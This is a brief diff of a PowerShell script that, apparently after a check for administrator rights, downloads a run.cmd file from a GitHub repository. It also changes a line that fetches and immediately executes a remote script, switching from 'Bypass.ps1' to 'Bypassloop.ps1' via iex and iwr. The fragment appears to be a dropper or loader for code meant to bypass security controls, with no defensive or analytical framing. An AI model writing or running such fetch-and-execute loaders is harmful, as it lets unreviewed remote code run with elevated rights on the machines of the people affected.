@@ -5,7 +5,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     # Download the CMD file
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$dir\run.cmd"
 
-    iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Bypass.ps1" -useb)
+    iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Bypassloop.ps1" -useb)
     Start-Sleep -Seconds 16
 }
 
